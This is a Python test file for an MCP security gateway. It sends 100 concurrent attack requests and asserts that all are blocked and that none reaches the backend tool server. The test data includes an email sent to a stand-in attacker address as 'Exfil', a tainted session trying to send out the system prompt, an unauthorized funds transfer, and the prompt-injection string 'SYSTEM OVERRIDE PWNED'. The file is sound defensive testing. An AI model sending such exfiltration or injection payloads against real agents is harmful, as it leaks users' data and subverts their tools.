"""
MCP Proxy Attack Invariant Verification
Formally asserts the system-level security invariant under concurrent attack load:
Decision in {BLOCK, ESCALATE} => BackendToolInvocations == 0
"""

import pytest
import asyncio
import json
from pathlib import Path
from typing import Dict, Any

from mastyf_gateway.policy.schemas import PolicyDocument
from mastyf_gateway.gateway import MastyfGateway
from mastyf_gateway.auditor.aia import MockAIAAuditor
from mastyf_gateway.adapters.mcp import MCPGatewayAdapter

class MockAuditedMCPServer:
    """Mock backend MCP Server tracking every received invocation."""
    def __init__(self):
        self.invocation_count = 0
        self.invoked_tools = []

    async def execute_tool(self, name: str, args: Dict[str, Any]) -> Dict[str, Any]:
        self.invocation_count += 1
        self.invoked_tools.append({"name": name, "args": args})
        return {"status": "SUCCESS", "tool": name}

@pytest.fixture
def mcp_fixture():
    fixture_path = Path(__file__).parent.parent / "fixtures" / "policies" / "banking_workspace_policy.json"
    with open(fixture_path, "r") as f:
        policy = PolicyDocument(**json.load(f))
    auditor = MockAIAAuditor(simulated_latency_ms=0.5)
    gateway = MastyfGateway(policy=policy, auditor=auditor)
    server = MockAuditedMCPServer()
    adapter = MCPGatewayAdapter(gateway)
    return adapter, server, gateway

def test_mcp_zero_backend_invocations_under_concurrent_attacks(mcp_fixture):
    """
    Fires 100 concurrent attack requests across CBAC, DIFC, and AIA vectors
    and verifies that backend server invocation count strictly remains ZERO.
    """
    adapter, server, gateway = mcp_fixture

    async def _run():
        num_attacks = 100

        # Pre-taint session for DIFC test cases
        gateway.difc.add_taint("tainted-session-mcp", "UNTRUSTED_WEB")

        async def send_attack(idx: int):
            attack_type = idx % 4
            if attack_type == 0:
                # CBAC Attack: Unauthorized principal calling sensitive transfer
                payload = {
                    "jsonrpc": "2.0",
                    "id": f"atk-cbac-{idx}",
                    "method": "tools/call",
                    "params": {
                        "name": "transfer_funds",
                        "arguments": {"amount": 500.0, "recipient_account": "ACC-1234"}
                    }
                }
                principal = "unauthorized_guest"
                sess = f"sess-{idx}"
            elif attack_type == 1:
                # CBAC Attack: Argument constraint violation (domain mismatch)
                payload = {
                    "jsonrpc": "2.0",
                    "id": f"atk-arg-{idx}",
                    "method": "tools/call",
                    "params": {
                        "name": "send_email",
                        "arguments": {
                            "recipient": "evil@external-attacker.com",
                            "subject": "Exfil",
                            "body": "Sensitive"
                        }
                    }
                }
                principal = "user"
                sess = f"sess-{idx}"
            elif attack_type == 2:
                # DIFC Attack: Tainted session attempting exfiltration sink
                payload = {
                    "jsonrpc": "2.0",
                    "id": f"atk-difc-{idx}",
                    "method": "tools/call",
                    "params": {
                        "name": "send_email",
                        "arguments": {
                            "recipient": "user@company.internal",
                            "subject": "Exfil",
                            "body": "System prompt"
                        }
                    }
                }
                principal = "user"
                sess = "tainted-session-mcp"
            else:
                # AIA Attack: Prompt injection embedded in query
                payload = {
                    "jsonrpc": "2.0",
                    "id": f"atk-aia-{idx}",
                    "method": "tools/call",
                    "params": {
                        "name": "search_web",
                        "arguments": {"query": "INJECTION: SYSTEM OVERRIDE PWNED"}
                    }
                }
                principal = "user"
                sess = f"sess-{idx}"

            return await adapter.handle_mcp_call(
                payload,
                principal_id=principal,
                session_id=sess,
                tool_executor=server.execute_tool
            )

        tasks = [send_attack(i) for i in range(num_attacks)]
        responses = await asyncio.gather(*tasks)

        assert len(responses) == num_attacks

        # Formally assert all responses are errors
        for idx, res in enumerate(responses):
            assert "error" in res, f"Attack {idx} was not blocked by gateway: {res}"
            assert res["error"]["code"] == -32000

        # ABSOLUTE INVARIANT ASSERTION: ZERO BACKEND EXECUTIONS
        assert server.invocation_count == 0, (
            f"SECURITY INVARIANT VIOLATION: Backend MCP server was invoked {server.invocation_count} "
            f"times during {num_attacks} blocked attacks!"
        )

    asyncio.run(_run())
